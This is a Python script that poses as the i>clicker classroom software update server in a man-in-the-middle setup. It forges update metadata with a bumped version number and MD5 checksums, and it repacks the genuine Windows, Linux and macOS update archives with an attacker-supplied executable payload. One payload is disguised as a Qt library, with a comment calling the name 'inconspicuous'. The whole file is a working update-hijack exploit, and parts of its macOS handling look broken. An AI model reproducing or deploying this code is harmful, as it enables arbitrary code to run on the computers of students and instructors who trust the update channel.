#!/usr/bin/env python3
"""Emulate the i>clicker update server."""
import argparse
from datetime import date
import gzip
import hashlib
import http.server
import logging
import io
import os
import re
import shutil
import sys
import tarfile
import urllib.request
from xml.etree import ElementTree
from xml.etree.ElementTree import Element
import zipfile


REAL_HOST = "update.iclickergo.com"

# We fetch this path only to find the latest version number, so it doesn't
# matter which QA-*.xml file we use. Get the latest one at the time of this
# program's writing in order to minimize the chance it'll go missing.
XML_REMOTE_PATH = "/ic7files/iclicker/QA/iclicker-QA-114.xml"
WINDOWS_REMOTE_PATH = "/ic7files/iclicker/QA/update-iclicker-{}-win.zip"
LINUX_REMOTE_PATH = "/ic7files/iclicker/QA/update-iclicker-{}-linux.tar.gz"
MACOS_REMOTE_PATH = "/ic7files/iclicker/QA/update-iclicker-{}-mac.tar.gz"

PATH_REGEX = re.compile(r"^/ic7files/iclicker/QA/iclicker-QA-\d+\.xml(\?.*)?$")

DATA_DIR = "temp" # TODO: change
DATA_PATH = "/ic7files/iclicker/QA/"

WINDOWS_UPDATE_NAME = "update-iclicker-win.zip"
LINUX_UPDATE_NAME = "update-iclicker-linux.tar.gz"
MACOS_UPDATE_NAME = "update-iclicker-mac.tar.gz"


class ArgumentError(Exception):
    """Indicates that an error occurred because we were given bad input."""
    pass


def fetch_path(host, path):
    req = urllib.request.Request("http://{}{}".format(host, path))
    req.add_header("Host", REAL_HOST)

    return urllib.request.urlopen(req)


def get_latest_version(host):
    with fetch_path(host, XML_REMOTE_PATH) as rsp:
        root = ElementTree.fromstring(rsp.read())

    return root.get("forDevRevision"), root.get("forVersion")


def bump_version(revision, version):
    int_revision = int(revision)
    int_version = [int(c) for c in version.split('.')]

    int_revision += 1
    int_version[-1] += 1

    return str(int_revision), '.'.join([str(i) for i in int_version])


def md5sum(fobj):
    old_pos = fobj.tell()
    fobj.seek(0, os.SEEK_SET)

    digest = hashlib.md5()
    for buf in iter(lambda: fobj.read(64), b''):
        digest.update(buf)

    fobj.seek(old_pos, os.SEEK_SET)
    return digest.hexdigest()


def make_base_xml(archives, revision, version):
    """Create an XML tree specifying a forged update with given version."""
    def with_text(tag, text):
        elem = Element(tag)
        elem.text = text
        return elem

    root = Element(
        "mergedHistory",
        {
            "branch": "QA",
            "latestDevRevision": revision,
            "latestVersion": version
        }
    )

    desc = Element("description")
    root.append(desc)

    desc.append(with_text("framework", "i>clicker"))
    desc.append(with_text("devRevision", revision))
    desc.append(with_text("version", version))
    desc.append(with_text("date", date.today().isoformat()))

    update = Element("update")
    desc.append(update)

    for path, (_, ostype, fobj) in archives.items():
        flen = fobj.seek(0, os.SEEK_END)

        url = Element(
            "url",
            {
                "available": "1",
                "md5sum": md5sum(fobj),
                "os": ostype,
                "packageSizekB": str(flen // 1000),
                "sizekB": str(flen // 1000)
            }
        )
        url.text = "http://{}{}".format(REAL_HOST, path)

        update.append(url)

    return root


def create_request_handler(host, xml, archives):
    """Because http.server is stupid."""

    class RequestHandler(http.server.BaseHTTPRequestHandler):
        """Generates forged i>clicker update server responses."""
        def do_GET(self):
            """Handle a GET request."""
            if PATH_REGEX.match(self.path):
                try:
                    with fetch_path(host, self.path) as rsp:
                        real = ElementTree.fromstring(rsp.read())
                except Exception:
                    logging.exception("Failed to forward request")
                    self.send_error(http.HTTPStatus.INTERNAL_SERVER_ERROR)
                else:
                    xml.set("forDevRevision", real.get("forDevRevision"))
                    xml.set("forVersion", real.get("forVersion"))

                    data = ElementTree.tostring(xml, encoding='utf-8')

                    self.send_response(http.HTTPStatus.OK)
                    self.send_header("Content-Type", "text/xml")
                    self.send_header("Content-Length", str(len(data)))
                    self.end_headers()
                    self.wfile.write(data)
            else:
                try:
                    ctype, _, fobj = archives[self.path]
                except KeyError:
                    self.send_error(http.HTTPStatus.NOT_FOUND)
                else:
                    self.send_response(http.HTTPStatus.OK)
                    self.send_header("Content-Type", ctype)
                    flen = fobj.seek(0, os.SEEK_END)
                    self.send_header("Content-Length", str(flen))
                    self.end_headers()

                    fobj.seek(0, os.SEEK_SET)
                    shutil.copyfileobj(fobj, self.wfile)

    return RequestHandler


def parse_args():
    """Validate and process command-line arguments using argparse."""
    parser = argparse.ArgumentParser(
        description="Emulate the i>clicker update server.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    def valid_port(string):
        """argparse type which parses a port number."""
        try:
            value = int(string)
        except ValueError:
            raise argparse.ArgumentTypeError("port must be an integer")

        if value < 1 or value > 65535:
            raise argparse.ArgumentTypeError("port must be in the range 1-65535")

        return value

    parser.add_argument(
        "-p", "--port", type=valid_port, default=80, help="port to listen on"
    )
    parser.add_argument(
        "-H", "--host", default="127.0.0.1", help="address to bind to"
    )

    parser.add_argument(
        "-u", "--update-host", default=REAL_HOST,
        help=(
            "IP address of {}, for when the MITM setup prevents system DNS "
            "from resolving it properly".format(REAL_HOST)
        )
    )

    parser.add_argument(
        "-W", "--windows", type=argparse.FileType('rb'),
        help="executable payload for Windows"
    )
    parser.add_argument(
        "-L", "--linux", type=argparse.FileType('rb'),
        help="executable payload for Linux"
    )
    parser.add_argument(
        "-M", "--macos", type=argparse.FileType('rb'),
        help="executable payload for macOS"
    )

    return parser.parse_args()


def open_cached_archive(name):
    archive_path = os.path.join(DATA_DIR, name)

    try:
        fobj = open(archive_path, 'r+b')
        existed = True
    except FileNotFoundError:
        fobj = open(archive_path, 'w+b')
        existed = False

    return fobj, existed


def gen_windows_archive(payload, host, version):
    local, existed = open_cached_archive(WINDOWS_UPDATE_NAME)

    if not existed:
        with fetch_path(host, WINDOWS_REMOTE_PATH.format(version)) as remote:
            shutil.copyfileobj(remote, local)

        payload.seek(0, os.SEEK_SET)

        with zipfile.ZipFile(local, mode='a') as zfile:
            zfile.writestr("iclicker.exe", payload.read())

    payload.close()
    return ("application/zip", 'win', local)


def gen_linux_archive(payload, host, version):
    local, existed = open_cached_archive(LINUX_UPDATE_NAME)

    if not existed:
        temp = io.BytesIO()

        with fetch_path(host, LINUX_REMOTE_PATH.format(version)) as remote:
            with gzip.open(remote) as uncompressed:
                shutil.copyfileobj(uncompressed, temp)

        plen = payload.seek(0, os.SEEK_END)
        payload.seek(0, os.SEEK_SET)
        temp.seek(0, os.SEEK_SET)

        with tarfile.open(fileobj=temp, mode='a') as tar:
            pinfo = tarfile.TarInfo("Libs/libQt5Hal.so.5") # Nice and inconspicuous
            pinfo.size = plen
            pinfo.mode = 0o755
            tar.addfile(pinfo, payload)
            tar.add("launcher-linux.sh", arcname="iclicker.sh")

        temp.seek(0, os.SEEK_SET)

        with gzip.open(local, 'wb') as compressed:
            shutil.copyfileobj(temp, compressed)

    payload.close()
    return ("application/x-gzip", 'linux', local)


def gen_macos_archive(payload, host, version):
    local, existed = open_cached_archive(LINUX_UPDATE_NAME)

    if existed:
        temp = io.BytesIO()

        with fetch_path(host, MACOS_REMOTE_PATH.format(version)) as remote:
            with gzip.open(remote) as uncompressed:
                shutil.copyfileobj(uncompressed, temp)

        plen = payload.seek(0, os.SEEK_END)
        payload.seek(0, os.SEEK_SET)
        temp.seek(0, os.SEEK_SET)

        with tarfile.open(fileobj=temp, mode='w|gz') as tar:
            pinfo = tarfile.TarInfo("iclicker.app/Contents/MacOS/iclicker")
            pinfo.size = plen
            pinfo.mode = 0o755
            tar.addfile(pinfo, payload)

        temp.seek(0, os.SEEK_SET)

        with gzip.open(local, 'wb') as compressed:
            shutil.copyfileobj(temp, compressed)

    payload.close()
    return ("application/x-gzip", 'mac', local)


def main():
    """Command-line entry point."""
    args = parse_args()
    host = args.update_host

    os.makedirs(DATA_DIR, exist_ok=True)

    logging.info("Fetching version information")
    cur_revision, cur_version = get_latest_version(host)
    revision, version = bump_version(cur_revision, cur_version)

    logging.info(
        "Current i>clicker software version is %s (revision %s);"
        "Serving forged update with version %s (revision %s)",
        cur_version, cur_revision, version, revision
    )


    logging.info("Fetching existing archives. This may take a while...")

    archives = {}
    if args.windows is not None:
        archives["{}{}".format(DATA_PATH, WINDOWS_UPDATE_NAME)] = (
            gen_windows_archive(args.windows, host, cur_version)
        )

    if args.linux is not None:
        archives["{}{}".format(DATA_PATH, LINUX_UPDATE_NAME)] = (
            gen_linux_archive(args.linux, host, cur_version)
        )

    if args.macos is not None:
        archives["{}{}".format(DATA_PATH, MACOS_UPDATE_NAME)] = (
            gen_macos_archive(args.macos, host, cur_version)
        )

    logging.info("Archives ready")

    logging.info("Generating XML")
    xml = make_base_xml(archives, revision, version)

    logging.info("Preparation complete; starting server")
    try:
        server = http.server.HTTPServer(
            (args.host, args.port),
            create_request_handler(host, xml, archives)
        )
        server.serve_forever()
    except OSError as err:
        raise ArgumentError("Failed to start server: {}".format(err.strerror))


if __name__ == "__main__":
    try:
        logging.basicConfig(level=logging.INFO)
        main()
    except ArgumentError as err:
        print(
            "{}: {}".format(os.path.basename(sys.argv[0]), err.args[0]),
            file=sys.stderr
        )
        sys.exit(1)
    except KeyboardInterrupt:
        pass
